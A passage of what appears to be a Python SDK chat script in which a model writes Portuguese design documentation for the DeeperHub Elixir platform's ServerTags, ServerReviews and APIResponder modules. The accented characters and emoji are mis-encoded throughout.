    *   Metadados: `%{tag_id: id, name: name, admin_id: id}`
*   `[:deeper_hub, :server_tags, :association, :created | :deleted]`
    *   Metadados: `%{server_id: id, tag_id: id, user_id: id}`
*   `[:deeper_hub, :server_tags, :query, :list_by_server | :list_by_tags | :list_popular]`
    *   Metadados: `%{filters: map, result_count: count}`

## ‚ùå 11. Tratamento de Erros

*   Retornar `{:error, changeset}` para falhas de valida√ß√£o Ecto.
*   Retornar `{:error, :unauthorized}` para falhas de permiss√£o.
*   Retornar `{:error, :limit_exceeded}` se tentar adicionar mais tags que o permitido.
*   Falhas ao interagir com o cache n√£o devem impedir a opera√ß√£o principal, mas devem ser logadas.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Valida√ß√£o de Entrada:** Validar rigorosamente o nome das tags para prevenir XSS se as tags forem exibidas diretamente sem escaping adicional (embora devam ser escapadas na renderiza√ß√£o).
*   **Modera√ß√£o de Tags:** Considerar um sistema de modera√ß√£o ou lista negra para tags ofensivas ou inadequadas, especialmente se as tags puderem ser criadas livremente pelos usu√°rios.
*   **Autoriza√ß√£o:** Garantir que apenas usu√°rios autorizados (propriet√°rios de servidor, admins) possam adicionar/remover tags de um servidor.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de normaliza√ß√£o de tags consistente.
*   Garanta que o `usage_count` seja atualizado corretamente.
*   Pense na performance das queries de listagem, especialmente `list_servers_by_tags` que pode envolver joins complexos ou m√∫ltiplas queries.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de sugest√£o de tags baseado em IA/ML com base na descri√ß√£o do servidor ou em tags de servidores similares.
*   [ ] Adicionar suporte para hierarquia de tags ou categorias de tags.
*   [ ] Permitir que administradores \"fixem\" ou \"promovam\" certas tags.
*   [ ] Criar um worker para recalcular `usage_count` periodicamente para garantir consist√™ncia, caso as atualiza√ß√µes at√¥micas se tornem um gargalo.
*   [ ] Interface administrativa para gerenciamento global de tags (merge de tags duplicadas/sin√¥nimas, exclus√£o, edi√ß√£o de descri√ß√µes).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo de tags √© um bom exemplo de como uma funcionalidade aparentemente simples pode ter v√°rias nuances e intera√ß√µes.

Agora, qual o pr√≥ximo? Podemos seguir com outro \"subm√≥dulo\" do `DeeperHub.Servers`, como `ServerReviews` ou `ServerPackages`, ou voltar para um m√≥dulo Core ou de Seguran√ßa?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com outro subm√≥dulo importante que interage com `DeeperHub.Servers`: o `DeeperHub.ServerReviews`. Este m√≥dulo lida com o feedback e avalia√ß√µes dos usu√°rios sobre os servidores.

---

# M√≥dulo: `DeeperHub.ServerReviews` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerReviews`

O m√≥dulo `DeeperHub.ServerReviews` √© respons√°vel por gerenciar as **avalia√ß√µes e coment√°rios (reviews)** feitos por usu√°rios sobre os servidores listados na plataforma DeeperHub. Ele permite que os jogadores compartilhem suas experi√™ncias, atribuam classifica√ß√µes (ratings) e escrevam coment√°rios detalhados, ajudando outros usu√°rios a tomar decis√µes informadas sobre quais servidores experimentar.

Este m√≥dulo abrange a cria√ß√£o, visualiza√ß√£o, atualiza√ß√£o (pelo autor ou moderadores), exclus√£o e modera√ß√£o de reviews, al√©m do c√°lculo de classifica√ß√µes m√©dias para os servidores. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Cria√ß√£o de Reviews (`create_review/1`):**
    *   Permitir que usu√°rios autenticados submetam reviews para um servidor.
    *   Uma review normalmente inclui uma classifica√ß√£o num√©rica (ex: 1 a 5 estrelas), um t√≠tulo opcional e um corpo de texto para o coment√°rio.
    *   Impedir que um usu√°rio envie m√∫ltiplas reviews para o mesmo servidor (ou permitir apenas a atualiza√ß√£o da review existente).
*   **Visualiza√ß√£o de Reviews:**
    *   Listar todas as reviews para um servidor espec√≠fico (`list_reviews_by_server/2`).
    *   Listar todas as reviews feitas por um usu√°rio espec√≠fico (`list_reviews_by_user/2`).
    *   Obter uma review espec√≠fica pelo seu ID (`get_review/1`).
    *   Suportar pagina√ß√£o e ordena√ß√£o (ex: por data, por classifica√ß√£o, por utilidade).
*   **Atualiza√ß√£o de Reviews (`update_review/2`):**
    *   Permitir que o autor de uma review edite seu conte√∫do ou classifica√ß√£o.
    *   Permitir que moderadores editem ou ocultem partes de uma review se violar as diretrizes.
*   **Exclus√£o de Reviews (`delete_review/1`):**
    *   Permitir que o autor de uma review a exclua.
    *   Permitir que moderadores/administradores excluam reviews inadequadas.
*   **C√°lculo de Classifica√ß√£o M√©dia (`get_server_rating_average/1`):**
    *   Calcular e manter a classifica√ß√£o m√©dia para cada servidor com base nas reviews recebidas.
    *   Atualizar a m√©dia quando novas reviews s√£o adicionadas, atualizadas ou exclu√≠das.
*   **Modera√ß√£o de Reviews:**
    *   Sistema para sinalizar reviews (`report_review/2` - pode ser um subm√≥dulo de `UserInteractions` ou aqui).
    *   Interface para moderadores revisarem reviews sinalizadas e tomarem a√ß√µes (aprovar, editar, excluir).
    *   (Opcional) Filtros autom√°ticos para linguagem ofensiva.
*   **Rea√ß√µes a Reviews (Likes/Dislikes, √ötil/N√£o √ötil):**
    *   Permitir que usu√°rios reajam a reviews para indicar sua utilidade ou concord√¢ncia (via `react_to_review/3` - pode ser parte deste m√≥dulo ou `UserInteractions`).
*   **Valida√ß√£o e Sanitiza√ß√£o de Conte√∫do:**
    *   Validar o conte√∫do da review (ex: comprimento m√≠nimo/m√°ximo, classifica√ß√£o dentro do range).
    *   Sanitizar o texto da review para prevenir XSS (integrando com `DeeperHub.Security.XssProtection` e `DeeperHub.Services.Shared.ContentValidation`).
*   **Observabilidade e Auditoria:**
    *   Registrar logs e m√©tricas para opera√ß√µes de review.
    *   Publicar eventos de dom√≠nio (review criada, atualizada, exclu√≠da) no `Core.EventBus`.
    *   Auditar a√ß√µes de modera√ß√£o.
*   **Limita√ß√£o de Taxa (`RateLimitIntegration`):**
    *   Aplicar rate limiting para submiss√£o, edi√ß√£o e outras a√ß√µes de review.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerReviews` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a reviews de servidor.
    *   Delega para o `ServerReviewsService`.
2.  **`DeeperHub.ServerReviews.Services.ServerReviewsService` (ou `DefaultServerReviewsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para reviews.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ReviewSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id` e atualizar a classifica√ß√£o m√©dia do servidor.
        *   `DeeperHub.Accounts`: Para validar `user_id` e obter informa√ß√µes do autor.
        *   `DeeperHub.Auth`/`RBAC`: Para verificar permiss√µes (ex: autor pode editar/excluir, moderador pode excluir).
        *   `DeeperHub.Security.XssProtection` / `Shared.ContentValidation`: Para sanitizar o conte√∫do das reviews.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.Cache`: Para cachear reviews de servidores populares ou classifica√ß√µes m√©dias.
3.  **`DeeperHub.ServerReviews.Schema.Review`:**
    *   Schema Ecto para a entidade Review.
    *   Campos: `id`, `server_id`, `user_id`, `rating` (integer), `title` (string, opcional), `content` (text), `is_verified_purchase` (boolean, opcional), `is_recommended` (boolean, opcional), `status` (ex: `:approved`, `:pending_moderation`, `:rejected`), `edited_at`, `inserted_at`, `updated_at`.
4.  **(Opcional) `DeeperHub.ServerReviews.Schema.ReviewReaction`:**
    *   Schema para rea√ß√µes a reviews (`user_id`, `review_id`, `reaction_type` (`:like`, `:dislike`, `:helpful`)).
5.  **`DeeperHub.ServerReviews.Storage` (ou l√≥gica dentro do `ServerReviewsService`):**
    *   Encapsula as consultas Ecto.
6.  **`DeeperHub.ServerReviews.CachedAdapter` (Opcional):**
    *   Camada de cache expl√≠cita para reviews e m√©dias.
7.  **`DeeperHub.ServerReviews.RateLimitIntegration`:**
    *   Aplica rate limiting.
8.  **`DeeperHub.ServerReviews.SecurityIntegration`:**
    *   L√≥gica espec√≠fica de seguran√ßa para reviews (sanitiza√ß√£o).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_reviews/
‚îú‚îÄ‚îÄ server_reviews.ex                 # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_reviews_service.ex     # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ review.ex
‚îÇ   ‚îî‚îÄ‚îÄ review_reaction.ex            # Opcional
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional) Camada de cache
‚îú‚îÄ‚îÄ rate_limit_integration.ex
‚îú‚îÄ‚îÄ security_integration.ex
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se houver GenServers, ex: para modera√ß√£o ass√≠ncrona)
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Rela√ß√£o com Servidores e Usu√°rios:** Uma review sempre pertence a um servidor e a um usu√°rio.
*   **Atualiza√ß√£o da M√©dia de Rating:** A classifica√ß√£o m√©dia de um servidor deve ser atualizada eficientemente sempre que uma review for adicionada, editada (se a classifica√ß√£o mudar) ou exclu√≠da. Isso pode ser feito via callbacks Ecto, eventos, ou um c√°lculo peri√≥dico. Um campo denormalizado no `ServerSchema` √© comum.
*   **Modera√ß√£o:** Implementar um fluxo de modera√ß√£o (manual ou semi-automatizado) √© importante para manter a qualidade das reviews.
*   **Evitar Abuso:** Rate limiting na submiss√£o de reviews e detec√ß√£o de padr√µes de reviews falsas.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Jogador Escreve uma Review para um Servidor:**
    *   Jogador est√° na p√°gina do servidor, clica em \"Escrever Review\".
    *   Preenche formul√°rio (rating, t√≠tulo, coment√°rio).
    *   API chama `DeeperHub.ServerReviews.create_review(user_id, server_id, review_attrs)`.
    *   Servi√ßo valida, sanitiza, persiste, atualiza a m√©dia do servidor e publica evento.
*   **Outro Jogador L√™ Reviews de um Servidor:**
    *   API chama `DeeperHub.ServerReviews.list_reviews_by_server(server_id, %{sort_by: :helpful, page: 1})`.
    *   Servi√ßo busca as reviews (possivelmente do cache), incluindo contagem de rea√ß√µes.
*   **Moderador Remove uma Review Inapropriada:**
    *   Moderador identifica uma review que viola as diretrizes.
    *   Chama `DeeperHub.ServerReviews.delete_review(review_id, admin_user_id, %{reason: \"Conte√∫do ofensivo\"})`.
    *   Servi√ßo verifica permiss√µes, exclui a review, atualiza a m√©dia do servidor e audita a a√ß√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Cria√ß√£o de Review

1.  **Requisi√ß√£o API/UI:** Usu√°rio submete o formul√°rio de review.
2.  **Controller API:** Valida autentica√ß√£o. Chama `DeeperHub.ServerReviews.create_review(current_user.id, server_id, params[\"review\"])`.
3.  **`ServerReviews` (Fachada):** Delega para `ServerReviewsService.create_review/3`.
4.  **`ServerReviewsService.create_review/3`:**
    *   Verifica se o usu√°rio j√° fez uma review para este servidor (pol√≠tica: uma por usu√°rio).
    *   Chama `DeeperHub.Security.XssProtection` / `Shared.ContentValidation` para validar e sanitizar `title` e `content`.
    *   Cria um changeset para `DeeperHub.ServerReviews.Schema.Review`.
    *   Se o changeset for v√°lido:
        *   Inicia uma transa√ß√£o `Core.Repo.transaction/2`.
        *   Dentro da transa√ß√£o:
            *   `Core.Repo.insert(changeset)`.
            *   Chama `DeeperHub.Servers.Services.DefaultServersService.recalculate_average_rating(server_id)` (ou uma fun√ß√£o similar).
        *   Se a transa√ß√£o for bem-sucedida:
            *   Publica evento `server_review_created` via `Core.EventBus`.
            *   Invalida caches relevantes (reviews do servidor, lista de reviews do usu√°rio).
            *   Retorna `{:ok, review_struct}`.
        *   Se a transa√ß√£o falhar, retorna erro.
    *   Se o changeset for inv√°lido, retorna `{:error, changeset}`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerReviews`)

### 6.1. `DeeperHub.ServerReviews.create_review(user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, Review.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descri√ß√£o:** Cria uma nova review para um servidor.
*   **`attrs`:** `%{rating: 1..5, title: String.t() | nil, content: String.t()}`.

### 6.2. `DeeperHub.ServerReviews.get_review(review_id :: String.t()) :: {:ok, Review.t() | nil}`

*   **Descri√ß√£o:** Obt√©m uma review pelo seu ID.

### 6.3. `DeeperHub.ServerReviews.list_reviews_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(Review.t()), Pagination.t()}`

*   **Descri√ß√£o:** Lista reviews para um servidor.
*   **`opts`:** `:page`, `:per_page`, `:sort_by` (`:rating_desc`, `:rating_asc`, `:newest`, `:oldest`, `:most_helpful`), `:filter_rating` (integer).

### 6.4. `DeeperHub.ServerReviews.list_reviews_by_user(user_id :: String.t(), opts :: keyword()) :: {:ok, list(Review.t()), Pagination.t()}`

*   **Descri√ß√£o:** Lista reviews feitas por um usu√°rio.

### 6.5. `DeeperHub.ServerReviews.update_review(review_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Review.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`

*   **Descri√ß√£o:** Atualiza uma review existente. Requer que `current_user_id` seja o autor ou moderador.

### 6.6. `DeeperHub.ServerReviews.delete_review(review_id :: String.t(), current_user_id :: String.t(), opts :: keyword()) :: :ok | {:error, :unauthorized | :not_found}`

*   **Descri√ß√£o:** Exclui uma review. Requer autor ou moderador.
*   **`opts`:** `:reason` (String.t) para auditoria de modera√ß√£o.

### 6.7. `DeeperHub.ServerReviews.get_server_rating_average(server_id :: String.t()) :: {:ok, %{average_rating: float() | nil, review_count: integer()}}`

*   **Descri√ß√£o:** Retorna a classifica√ß√£o m√©dia e o n√∫mero de reviews de um servidor.

### 6.8. `DeeperHub.ServerReviews.react_to_review(user_id :: String.t(), review_id :: String.t(), reaction_type :: :like | :dislike | :helpful) :: {:ok, Review.t()} | {:error, term()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Permite que um usu√°rio reaja a uma review.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_reviews, :enabled]`** (Boolean): Habilita/desabilita o sistema de reviews. (Padr√£o: `true`)
*   **`[:server_reviews, :min_rating_value]`** (Integer): Valor m√≠nimo para rating. (Padr√£o: `1`)
*   **`[:server_reviews, :max_rating_value]`** (Integer): Valor m√°ximo. (Padr√£o: `5`)
*   **`[:server_reviews, :max_content_length]`** (Integer): Comprimento m√°ximo do texto da review. (Padr√£o: `5000`)
*   **`[:server_reviews, :allow_editing_after_minutes]`** (Integer): Por quantos minutos ap√≥s a postagem uma review pode ser editada pelo autor. `0` para sempre, `nil` para nunca. (Padr√£o: `60`)
*   **`[:server_reviews, :reviews_per_server_per_user]`** (Integer): Quantas reviews um usu√°rio pode fazer por servidor (geralmente `1`).
*   **`[:server_reviews, :default_sort_order]`** (Atom): Ordem padr√£o para listagem de reviews (ex: `:newest`).
*   **`[:server_reviews, :cache, :reviews_by_server_ttl_seconds]`** (Integer).
*   **`[:server_reviews, :cache, :average_rating_ttl_seconds]`** (Integer).
*   **`[:server_reviews, :moderation, :auto_flag_keywords]`** (List de Strings): Palavras-chave que auto-sinalizam uma review para modera√ß√£o.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.Repo`, `Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Servers`: Para associar reviews a servidores e obter/atualizar `average_rating`.
*   `DeeperHub.Accounts`: Para associar reviews a usu√°rios.
*   `DeeperHub.Auth` / `DeeperHub.RBAC`: Para verificar permiss√µes de edi√ß√£o/exclus√£o.
*   `DeeperHub.Security.XssProtection` e `DeeperHub.Services.Shared.ContentValidation`: Para sanitizar conte√∫do.
*   `DeeperHub.ServerReviews.RateLimitIntegration`.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **M√≥dulo `DeeperHub.Servers`:**
    *   Ao exibir detalhes de um servidor, pode chamar `ServerReviews.list_reviews_by_server/2` e `ServerReviews.get_server_rating_average/1`.
*   **Interface do Usu√°rio (Frontend/API):**
    *   Fornecer formul√°rios para `create_review` e `update_review`.
    *   Exibir listas de reviews e a m√©dia de rating.
    *   Permitir que usu√°rios reajam a reviews.
*   **Painel de Modera√ß√£o:**
    *   Listar reviews sinalizadas ou todas as reviews com op√ß√µes de filtro.
    *   Permitir que moderadores editem/ocultem/excluam reviews.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de reviews, incluindo valida√ß√µes.
*   Testar a l√≥gica de permiss√£o (autor vs. outros usu√°rios vs. moderadores).
*   Testar o c√°lculo e atualiza√ß√£o da m√©dia de rating do servidor.
*   Testar a sanitiza√ß√£o de conte√∫do.
*   Testar a pagina√ß√£o e ordena√ß√£o da listagem de reviews.
*   Testar a funcionalidade de rea√ß√µes.
*   Localiza√ß√£o: `test/deeper_hub/server_reviews/`.

### 10.2. M√©tricas

*   `deeper_hub.server_reviews.created.count` (tags: `server_id`, `rating_value`)
*   `deeper_hub.server_reviews.updated.count`
*   `deeper_hub.server_reviews.deleted.count` (tags: `deleted_by_role` (`author`, `moderator`))
*   `deeper_hub.server_reviews.reactions.count` (tags: `review_id`, `reaction_type`)
*   `deeper_hub.server_reviews.average_rating.updated.count` (tags: `server_id`)
*   `deeper_hub.server_reviews.content_sanitized.count`

### 10.3. Logs

*   **N√≠vel INFO:** Nova review criada/atualizada/exclu√≠da. M√©dia de rating recalculada.
*   **N√≠vel WARNING:** Tentativa n√£o autorizada de editar/excluir review. Conte√∫do de review sinalizado para modera√ß√£o.
*   **N√≠vel ERROR:** Falha ao persistir review ou atualizar m√©dia de rating.

### 10.4. Telemetria

*   `[:deeper_hub, :server_reviews, :review, :created | :updated | :deleted]`
    *   Metadados: `%{review_id: id, server_id: id, user_id: id, rating: val}`
*   `[:deeper_hub, :server_reviews, :server, :rating_recalculated]`
    *   Metadados: `%{server_id: id, new_average_rating: avg, review_count: count}`
*   `[:deeper_hub, :server_reviews, :reaction, :added]`
    *   Metadados: `%{review_id: id, user_id: id, type: type}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o ao criar/atualizar review retornam `{:error, changeset}`.
*   Opera√ß√µes n√£o autorizadas retornam `{:error, :unauthorized}`.
*   Tentativas de operar em reviews/servidores n√£o existentes retornam `{:error, :not_found}`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Sanitiza√ß√£o de Conte√∫do:** Essencial para prevenir XSS em t√≠tulos e coment√°rios de reviews.
*   **Preven√ß√£o de Spam/Abuso:** Rate limiting para submiss√£o de reviews. Captcha pode ser necess√°rio se o abuso for alto.
*   **Manipula√ß√£o de Rating:** Detectar e mitigar tentativas de manipula√ß√£o de classifica√ß√£o (ex: m√∫ltiplas contas falsas avaliando o mesmo servidor). `FraudDetection` pode ajudar.
*   **Privacidade do Autor:** Considerar se as reviews devem ser an√¥nimas ou vinculadas ao perfil do usu√°rio, e como isso afeta a privacidade.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de c√°lculo da m√©dia de rating eficiente e correta.
*   Garanta que as verifica√ß√µes de permiss√£o sejam robustas.
*   Considere o impacto na performance ao adicionar novos filtros ou ordena√ß√µes na listagem de reviews.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"review mais √∫til\" baseado em votos da comunidade.
*   [ ] Permitir que propriet√°rios de servidores respondam publicamente √†s reviews.
*   [ ] Adicionar an√°lise de sentimento √†s reviews para extrair insights.
*   [ ] Permitir que usu√°rios filtrem reviews por idioma.
*   [ ] Implementar um sistema de \"review verificada\" para jogadores que comprovadamente jogaram no servidor (ex: atrav√©s de integra√ß√£o com o jogo ou tempo de jogo).
*   [ ] Op√ß√£o para usu√°rios reportarem reviews como √∫teis, spam, ou abusivas. (J√° mencionado, mas refor√ßar).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este README do `ServerReviews` cobre os aspectos centrais.

O que gostaria de detalhar em seguida? Poder√≠amos continuar com os \"subm√≥dulos de servi√ßo\" como `ServerPackages`, `ServerEvents`, ou mudar para um m√≥dulo Core diferente como `DeeperHub.Core.BackgroundTaskManager` (que j√° come√ßamos)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° documentamos o `DeeperHub.Core.BackgroundTaskManager`.

Vamos ent√£o para outro m√≥dulo Core que √© fundamental para a intera√ß√£o da aplica√ß√£o com o mundo externo e para a consist√™ncia interna: `DeeperHub.Core.APIResponder`. Ele garante que todas as respostas da API sigam um padr√£o, facilitando a vida dos desenvolvedores de frontend e de integra√ß√µes.

---

# M√≥dulo: `DeeperHub.Core.APIResponder` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.APIResponder`

O m√≥dulo `DeeperHub.Core.APIResponder` √© um componente utilit√°rio central no DeeperHub, respons√°vel por **padronizar a estrutura e o formato de todas as respostas HTTP da API REST**. Ele fornece um conjunto de fun√ß√µes para gerar respostas JSON consistentes para diferentes cen√°rios, incluindo sucessos, erros de aplica√ß√£o, erros de valida√ß√£o e outras condi√ß√µes.

Ao centralizar a formata√ß√£o de respostas, o `APIResponder` garante que os clientes da API (frontends, aplicativos m√≥veis, servi√ßos de terceiros) recebam dados de uma maneira previs√≠vel e f√°cil de consumir, melhorando a experi√™ncia de integra√ß√£o e reduzindo a complexidade no tratamento de respostas no lado do cliente. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Formata√ß√£o de Respostas de Sucesso (`format_success/3`):**
    *   Envelopar os dados de sucesso em uma estrutura JSON padr√£o, incluindo um status (`\"success\"`), os dados principais (`data`), uma mensagem opcional e metadados opcionais (ex: para pagina√ß√£o).
*   **Formata√ß√£o de Respostas de Erro (`format_error/3`):**
    *   Gerar respostas de erro estruturadas, incluindo um status (`\"error\"`), um motivo ou c√≥digo de erro, detalhes adicionais e uma mensagem descritiva.
    *   Mapear diferentes tipos de erro internos para c√≥digos de status HTTP apropriados (`error_to_http_status/1`).
*   **Formata√ß√£o de Erros de Valida√ß√£o (`format_validation_error/2`):**
    *   Formatar especificamente erros de valida√ß√£o (ex: de Ecto.Changesets) em uma estrutura clara que detalhe os campos e as mensagens de erro.
*   **Consist√™ncia de Estrutura JSON:**
    *   Garantir que todas as respostas da API sigam um esquema JSON comum (ex: `{\"status\": \"...\", \"data\": ..., \"error\": ..., \"message\": ..., \"meta\": ...}`).
*   **Codifica√ß√£o e Decodifica√ß√£o JSON (Opcional, ou delega√ß√£o):**
    *   Fornecer fun√ß√µes utilit√°rias para codificar termos Elixir para JSON (`encode/2`, `encode!/2`) e decodificar JSON para termos Elixir (`decode/2`, `decode!/2`), embora isso possa ser delegado a bibliotecas como `Jason` diretamente nos controllers. A inclus√£o aqui seria por conveni√™ncia e padroniza√ß√£o de op√ß√µes.
*   **Suporte a Padr√µes de API (Opcional):**
    *   Facilitar a conformidade com padr√µes de API como JSON:API, se adotado pelo projeto, embora a estrutura padr√£o descrita seja mais simples.
*   **Integra√ß√£o com Controllers Phoenix:**
    *   Ser facilmente utiliz√°vel pelos controllers Phoenix para enviar respostas HTTP (ex: `json(conn, APIResponder.format_success(data))`).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.APIResponder` (M√≥dulo Funcional):**
    *   **Responsabilidade:** Cont√©m todas as fun√ß√µes p√∫blicas para formata√ß√£o de respostas.
    *   √â stateless e suas fun√ß√µes s√£o puras (dado os mesmos inputs, produzem os mesmos outputs), exceto pela poss√≠vel gera√ß√£o de timestamps.
    *   **Intera√ß√µes:**
        *   Pode utilizar uma biblioteca JSON como `Jason` internamente para codifica√ß√£o (se essa funcionalidade for inclu√≠da aqui).
        *   Pode consultar `DeeperHub.Core.ConfigManager` para formatos de data/hora padr√£o ou outras prefer√™ncias de formata√ß√£o de resposta.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/api_responder.ex  # Cont√©m todas as fun√ß√µes de formata√ß√£o
```
Este m√≥dulo √© tipicamente simples e autocontido, n√£o necessitando de uma estrutura de diret√≥rios complexa, GenServers ou supervisores.

### 3.3. Decis√µes de Design Importantes

*   **Estrutura de Resposta Padr√£o:** Definir uma estrutura JSON clara e consistente para todas as respostas. Uma sugest√£o comum √©:
    ```json
    // Sucesso
    {
      \"status\": \"success\", // ou um c√≥digo HTTP num√©rico como 200, 201
      \"data\": { /* dados principais */ },
      \"message\": \"Opera√ß√£o realizada com sucesso.\", // opcional
      \"meta\": { \"pagination\": { /* ... */ } } // opcional
    }

    // Erro
    {
      \"status\": \"error\", // ou um c√≥digo HTTP num√©rico como 400, 404, 500
      \"error\": {
        \"code\": \"ERROR_CODE_INTERNAL\", // um c√≥digo de erro da aplica√ß√£o
        \"message\": \"Uma descri√ß√£o do erro.\",
        \"details\": { /* informa√ß√µes adicionais sobre o erro, ex: campos de valida√ß√£o */ }
      },
      \"data\": null,
      \"message\": \"Uma descri√ß√£o do erro.\", // pode ser o mesmo que error.message
      \"meta\": null
    }
    ```
*   **Mensagens de Erro Claras:** Mensagens de erro devem ser √∫teis para o desenvolvedor que consome a API, mas n√£o devem vazar informa√ß√µes sens√≠veis do sistema.
*   **C√≥digos de Status HTTP:** Usar c√≥digos de status HTTP semanticamente corretos √© fundamental. O `APIResponder` pode ajudar a mapear erros internos para esses c√≥digos.
*   **Internacionaliza√ß√£o (i18n) de Mensagens:** Mensagens de erro e sucesso podem precisar ser traduzidas. O `APIResponder` pode integrar com `DeeperHub.Core.Internationalization` para isso.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Controller Retorna uma Lista de Recursos:**
    *   `UserController` busca uma lista de usu√°rios.
    *   Chama `APIResponder.format_success(list_of_users_maps, \"Usu√°rios listados com sucesso.\", %{total: count})`.
    *   Envia a resposta JSON resultante com status 200.
*   **Controller Cria um Novo Recurso:**
    *   `ServerController` cria um novo servidor.
    *   Chama `APIResponder.format_success(new_server_map, \"Servidor criado com sucesso.\")`.
    *   Envia a resposta JSON resultante com status 201 Created.
*   **Controller Lida com um Erro de Valida√ß√£o:**
    *   `AccountService` retorna `{:error, changeset}`.
    *   Controller chama `APIResponder.format_validation_error(changeset.errors, \"Dados inv√°lidos fornecidos.\")`.
    *   Envia a resposta JSON resultante com status 422 Unprocessable Entity.
*   **Controller Lida com Recurso N√£o Encontrado:**
    *   `ServerService` retorna `{:error, :not_found}`.
    *   Controller chama `APIResponder.format_error(:not_found, \"O servidor solicitado n√£o existe.\")`.
    *   Determina o status HTTP (404) e envia a resposta.
*   **Controller Lida com Erro Interno:**
    *   Ocorre uma exce√ß√£o inesperada. Um Plug de tratamento de exce√ß√µes captura a exce√ß√£o.
    *   O Plug chama `APIResponder.format_error(:internal_server_error, \"Ocorreu um erro inesperado. Tente novamente mais tarde.\")`.
    *   Envia a resposta JSON com status 500.

## üåä 5. Fluxos Importantes

### Fluxo de Formata√ß√£o de Resposta de Sucesso em um Controller Phoenix

1.  **Servi√ßo de Dom√≠nio:** Retorna dados para o controller (ex: `{:ok, user_data_map}`).
2.  **Controller:**
    *   Recebe `user_data_map`.
    *   Prepara metadados de pagina√ß√£o, se aplic√°vel.
    *   Chama `formatted_response_body = DeeperHub.Core.APIResponder.format_success(user_data_map, \"Usu√°rio recuperado.\", pagination_meta)`.
    *   Usa a fun√ß√£o `json/2` do Phoenix: `json(conn |> put_status(200), formatted_response_body)`.
3.  **Phoenix/Plug:** Serializa `formatted_response_body` para JSON e envia a resposta HTTP.

### Fluxo de Formata√ß√£o de Resposta de Erro de Valida√ß√£o

1.  **Servi√ßo de Dom√≠nio:** Tenta criar/atualizar um recurso e o changeset Ecto √© inv√°lido. Retorna `{:error, changeset}`.
2.  **Controller:**
    *   Recebe `{:error, changeset}`.
    *   Extrai os erros: `errors = Ecto.Changeset.traverse_errors(changeset, & MyAppWeb.ErrorHelpers.translate_error/1)`.
    *   Chama `formatted_error_body = DeeperHub.Core.APIResponder.format_validation_error(errors, \"Por favor, corrija os erros indicados.\")`.
    *   Chama `status_code = DeeperHub.Core.APIResponder.error_to_http_status(:validation_error)` (que retornaria 422).
    *   Usa `json(conn |> put_status(status_code), formatted_error_body)`.
3.  **Phoenix/Plug:** Envia a resposta.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original, com √™nfase na estrutura de resposta unificada)*

### 6.1. `DeeperHub.Core.APIResponder.format_success(data :: term(), message :: String.t() | nil, meta :: map() | nil) :: map()`

*   **Descri√ß√£o:** Formata uma resposta de sucesso.
*   **Retorno:** Mapa estruturado para sucesso (ex: `%{status: \"success\", data: data, message: message, meta: meta}`).

